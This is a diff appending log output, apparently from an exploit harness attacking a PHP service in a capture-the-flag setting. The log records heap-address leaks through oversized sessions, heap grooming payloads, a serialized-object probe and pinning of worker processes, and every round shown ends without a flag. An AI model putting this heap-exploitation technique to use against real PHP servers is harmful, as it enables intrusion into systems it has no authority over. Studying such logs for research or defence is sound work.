@@ -136,3 +136,120 @@
 [2026-10-22 00:39:24] place: pid=23 groom-sig hits: NOTFOUND
 [2026-10-22 00:39:24] place: pid=41 groom-sig hits: 0xfbd6bd139018 0xfbd6bd1aa018
 [2026-10-22 00:39:24] place: pid=65 groom-sig hits: NOTFOUND
+[2026-10-22 00:55:19] === round w2: cpid=3005106 bias=0xfbd6bf0c0000 basic_globals=0xfbd6bffde748
+[2026-10-22 00:55:19] baseline read: 6 children [20, 21, 22, 23, 41, 65]
+[2026-10-22 00:55:19] staged producer session sess_a005519aaaaaaaaaaaaaaaaaaaaaaaaa (72MB) + consumer sid ready
+[2026-10-22 00:55:19] producer: t=0.1s oom_signature=True len=553
+[2026-10-22 00:55:19] producer body: <br /> <b>Fatal error</b>:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 72000032 bytes) in <b>Unknown</b> on line <b>0</b><br /> <br /> <b>Warning</b>:  PHP Request Startup: Fa
+[2026-10-22 00:55:19] ORACLE cand: pid=21 off=816 data=0xfbd6bd1a8000 level=1
+[2026-10-22 00:55:19] ORACLE: child=21 &BG(unserialize).data=0xfbd6bffdea78 d_chunk=0xfbd6bd1a8000
+[2026-10-22 00:55:19] groom payload built: 8192B, LG=0xfbd6bd1a9000
+[2026-10-22 00:55:20] staged consumer session sess_b005519bbbbbbbbbbbbbbbbbbbbbbbbb: poc|O:9:Exception:0:{}
+[2026-10-22 00:55:20] consumer: t=0.3s len=6 FLAG=no
+[2026-10-22 00:55:20] consumer body:  <EOF>
+[2026-10-22 01:01:18] === round w3: cpid=3005106 bias=0xfbd6bf0c0000 basic_globals=0xfbd6bffde748
+[2026-10-22 01:01:18] baseline read: 5 children [20, 22, 23, 41, 65]
+[2026-10-22 01:01:19] staged producer session sess_a010118aaaaaaaaaaaaaaaaaaaaaaaaa (72MB) + consumer sid ready
+[2026-10-22 01:01:19] producer: t=0.1s oom_signature=True len=553
+[2026-10-22 01:01:19] producer body: <br /> <b>Fatal error</b>:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 72000032 bytes) in <b>Unknown</b> on line <b>0</b><br /> <br /> <b>Warning</b>:  PHP Request Startup: Fa
+[2026-10-22 01:01:19] ORACLE cand: pid=22 off=816 data=0xfbd6bd1a8000 level=1
+[2026-10-22 01:01:19] ORACLE: child=22 &BG(unserialize).data=0xfbd6bffdea78 d_chunk=0xfbd6bd1a8000
+[2026-10-22 01:01:19] groom payload built: 8192B, LG=0xfbd6bd1a9000
+[2026-10-22 01:01:19] staged consumer session sess_b010118bbbbbbbbbbbbbbbbbbbbbbbbb: poc|O:9:Exception:0:{}
+[2026-10-22 01:01:19] consumer: t=0.4s len=6 FLAG=no
+[2026-10-22 01:01:19] consumer body:  <EOF>
+[2026-10-22 01:01:45] === round w4: cpid=3005106 bias=0xfbd6bf0c0000 basic_globals=0xfbd6bffde748
+[2026-10-22 01:01:45] baseline read: 5 children [20, 23, 41, 65, 108]
+[2026-10-22 01:01:45] staged producer session sess_a010145aaaaaaaaaaaaaaaaaaaaaaaaa (72MB) + consumer sid ready
+[2026-10-22 01:01:45] producer: t=0.1s oom_signature=True len=553
+[2026-10-22 01:01:45] producer body: <br /> <b>Fatal error</b>:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 72000032 bytes) in <b>Unknown</b> on line <b>0</b><br /> <br /> <b>Warning</b>:  PHP Request Startup: Fa
+[2026-10-22 01:01:45] ORACLE cand: pid=41 off=816 data=0xfbd6bd1a8000 level=1
+[2026-10-22 01:01:45] ORACLE: child=41 &BG(unserialize).data=0xfbd6bffdea78 d_chunk=0xfbd6bd1a8000
+[2026-10-22 01:01:45] groom payload built: 8192B, LG=0xfbd6bd1a9000
+[2026-10-22 01:01:46] staged consumer session sess_b010145bbbbbbbbbbbbbbbbbbbbbbbbb: poc|O:9:Exception:0:{}
+[2026-10-22 01:01:46] consumer: t=0.4s len=6 FLAG=no
+[2026-10-22 01:01:46] consumer body:  <EOF>
+[2026-10-22 01:01:52] === round p6: cpid=3005106 bias=0xfbd6bf0c0000 basic_globals=0xfbd6bffde748
+[2026-10-22 01:01:52] baseline read: 5 children [20, 23, 65, 108, 142]
+[2026-10-22 01:01:52] place: comb=665600B filler=430080 payload_base=0xfa2f0ea6a000(expected)
+[2026-10-22 01:01:57] place: t=5.1s len=68693 tail=b'\n</body>\n</html>\n\r\n0\r\n\r\n\n<EOF>'
+[2026-10-22 01:01:58] place: pid=20 groom-sig hits: 0xfbd6bd1a6018
+[2026-10-22 01:01:58] place: pid=23 groom-sig hits: NOTFOUND
+[2026-10-22 01:01:58] place: pid=65 groom-sig hits: NOTFOUND
+[2026-10-22 01:01:58] place: pid=108 groom-sig hits: NOTFOUND
+[2026-10-22 01:01:58] place: pid=142 groom-sig hits: NOTFOUND
+[2026-10-22 01:01:58] place: pid=157 groom-sig hits: NOTFOUND
+[2026-10-22 01:05:36] === round w5: cpid=3005106 bias=0xfbd6bf0c0000 basic_globals=0xfbd6bffde748
+[2026-10-22 01:05:36] baseline read: 6 children [20, 23, 65, 108, 142, 157]
+[2026-10-22 01:05:36] staged producer session sess_a010536aaaaaaaaaaaaaaaaaaaaaaaaa (72MB) + consumer sid ready
+[2026-10-22 01:05:36] producer: t=0.1s oom_signature=True len=553
+[2026-10-22 01:05:36] producer body: <br /> <b>Fatal error</b>:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 72000032 bytes) in <b>Unknown</b> on line <b>0</b><br /> <br /> <b>Warning</b>:  PHP Request Startup: Fa
+[2026-10-22 01:05:36] ORACLE cand: pid=108 off=816 data=0xfbd6bd1a8000 level=1
+[2026-10-22 01:05:36] ORACLE: child=108 &BG(unserialize).data=0xfbd6bffdea78 d_chunk=0xfbd6bd1a8000
+[2026-10-22 01:05:36] groom payload built: 8192B, LG=0xfbd6bd1a9000
+[2026-10-22 01:05:36] staged consumer session sess_b010536bbbbbbbbbbbbbbbbbbbbbbbbb: poc|O:9:Exception:0:{}
+[2026-10-22 01:05:37] consumer: t=0.3s len=6 FLAG=no
+[2026-10-22 01:05:37] consumer body:  <EOF>
+[2026-10-22 01:05:50] place7 resp: t=5.1s len=68693 tail=b'/html>\n\r\n0\r\n\r\n\n<EOF>'
+[2026-10-22 01:05:51] pid=20 d_chunk[0]=0x0 expect=0xfbd6bffe0000 match=False
+[2026-10-22 01:05:51] pid=23 d_chunk[0]=0x0 expect=0xfbd6bffe0000 match=False
+[2026-10-22 01:05:51] pid=65 d_chunk[0]=0xfbd6bd1a0118 expect=0xfbd6bffe0000 match=False
+[2026-10-22 01:05:51] pid=142 d_chunk[0]=0x0 expect=0xfbd6bffe0000 match=False
+[2026-10-22 01:05:51] pid=157 d_chunk[0]=0x0 expect=0xfbd6bffe0000 match=False
+[2026-10-22 01:05:51] pid=191 d_chunk[0]=0x0 expect=0xfbd6bffe0000 match=False
+[2026-10-22 01:07:21] kids(host,ns): [(3018642, 19), (3018643, 20), (3018644, 21), (3018645, 22), (3018646, 23)]
+[2026-10-22 01:07:21] pinned child ns=19 host=3018642; stopped [3018643, 3018644, 3018645, 3018646]
+[2026-10-22 01:07:22] producer: t=0.1s oom=True len=553
+[2026-10-22 01:07:23] dbg oracle cand off=816 data=0xe60fbd06a000 level=1
+[2026-10-22 01:07:23] oracle: &BG(unserialize).data=0xe60fc00aea78 d=0xe60fbd06a000 bias=0xe60fbf190000
+[2026-10-22 01:07:23] consumer: t=0.4s len=6 FLAG=None
+[2026-10-22 01:07:23] cleanup: SIGCONT sent
+[2026-10-22 01:07:37] kids(host,ns): [(3019147, 19), (3019148, 20), (3019149, 21), (3019150, 22), (3019151, 23)]
+[2026-10-22 01:07:37] pinned child ns=19 host=3019147; stopped [3019148, 3019149, 3019150, 3019151]
+[2026-10-22 01:07:39] producer: t=0.1s oom=True len=553
+[2026-10-22 01:07:39] dbg oracle cand off=816 data=0xf7d1c21a8000 level=1
+[2026-10-22 01:07:39] oracle: &BG(unserialize).data=0xf7d1c50fea78 d=0xf7d1c21a8000 bias=0xf7d1c41e0000
+[2026-10-22 01:07:40] consumer: t=0.4s len=6 FLAG=None
+[2026-10-22 01:07:40] cleanup: SIGCONT sent
+[2026-10-22 01:07:57] kids(host,ns): [(3019726, 19), (3019727, 20), (3019728, 21), (3019729, 22), (3019730, 23)]
+[2026-10-22 01:07:57] pinned child ns=19 host=3019726; stopped [3019727, 3019728, 3019729, 3019730]
+[2026-10-22 01:07:59] producer: t=0.1s oom=True len=553
+[2026-10-22 01:07:59] dbg oracle cand off=816 data=0xecb4fada8000 level=1
+[2026-10-22 01:07:59] oracle: &BG(unserialize).data=0xecb4fdbdea78 d=0xecb4fada8000 bias=0xecb4fccc0000
+[2026-10-22 01:08:00] consumer: t=0.3s len=6 FLAG=None
+[2026-10-22 01:08:00] cleanup: SIGCONT sent
+[2026-10-22 01:08:24] kids(host,ns): [(3020354, 19), (3020355, 20), (3020356, 21), (3020357, 22), (3020358, 23)]
+[2026-10-22 01:08:24] pinned child ns=19 host=3020354; stopped [3020355, 3020356, 3020357, 3020358]
+[2026-10-22 01:08:26] producer: t=0.1s oom=True len=553
+[2026-10-22 01:08:26] dbg oracle cand off=816 data=0xe6a6019a8000 level=1
+[2026-10-22 01:08:26] oracle: &BG(unserialize).data=0xe6a60492ea78 d=0xe6a6019a8000 bias=0xe6a603a10000
+[2026-10-22 01:08:27] consumer: t=0.4s len=6 FLAG=None
+[2026-10-22 01:08:27] cleanup: SIGCONT sent
+[2026-10-22 01:09:23] kids(host,ns): [(3021077, 19), (3021078, 20), (3021079, 21), (3021080, 22), (3021081, 23)]
+[2026-10-22 01:09:23] pinned child ns=19 host=3021077; stopped [3021078, 3021079, 3021080, 3021081]
+[2026-10-22 01:09:25] producer: t=0.1s oom=True len=553
+[2026-10-22 01:09:25] dbg oracle cand off=816 data=0xfb23749a8000 level=1
+[2026-10-22 01:09:25] oracle: &BG(unserialize).data=0xfb237790ea78 d=0xfb23749a8000 bias=0xfb23769f0000
+[2026-10-22 01:09:26] consumer: t=0.4s len=6 FLAG=None
+[2026-10-22 01:09:26] cleanup: SIGCONT sent
+[2026-10-22 01:10:03] kids(host,ns): [(3021747, 19), (3021748, 20), (3021749, 21), (3021750, 22), (3021751, 23)]
+[2026-10-22 01:10:03] pinned child ns=19 host=3021747; stopped [3021748, 3021749, 3021750, 3021751]
+[2026-10-22 01:10:05] producer: t=0.1s oom=True len=553
+[2026-10-22 01:10:05] dbg oracle cand off=816 data=0xe163cc3a8000 level=1
+[2026-10-22 01:10:05] oracle: &BG(unserialize).data=0xe163cf31ea78 d=0xe163cc3a8000 bias=0xe163ce400000
+[2026-10-22 01:10:05] consumer: t=0.2s len=6 FLAG=None
+[2026-10-22 01:10:05] cleanup: SIGCONT sent
+[2026-10-22 01:10:17] kids(host,ns): [(3022159, 19), (3022160, 20), (3022161, 21), (3022162, 22), (3022163, 23)]
+[2026-10-22 01:10:17] pinned child ns=19 host=3022159; stopped [3022160, 3022161, 3022162, 3022163]
+[2026-10-22 01:10:18] producer: t=0.1s oom=True len=553
+[2026-10-22 01:10:18] dbg oracle cand off=816 data=0xf084995a8000 level=1
+[2026-10-22 01:10:18] oracle: &BG(unserialize).data=0xf0849c4dea78 d=0xf084995a8000 bias=0xf0849b5c0000
+[2026-10-22 01:10:19] consumer: t=0.2s len=6 FLAG=None
+[2026-10-22 01:10:19] cleanup: SIGCONT sent
+[2026-10-22 01:12:49] kids(host,ns): [(3023469, 19), (3023470, 20), (3023471, 21), (3023472, 22), (3023473, 23)]
+[2026-10-22 01:12:49] pinned child ns=19 host=3023469; stopped [3023470, 3023471, 3023472, 3023473]
+[2026-10-22 01:12:51] producer: t=0.1s oom=True len=553
+[2026-10-22 01:12:51] dbg oracle cand off=816 data=0xe3fc109a8000 level=1
+[2026-10-22 01:12:51] oracle: &BG(unserialize).data=0xe3fc138cea78 d=0xe3fc109a8000 bias=0xe3fc129b0000
+[2026-10-22 01:12:51] consumer: t=0.2s len=6 FLAG=None
+[2026-10-22 01:12:51] cleanup: SIGCONT sent
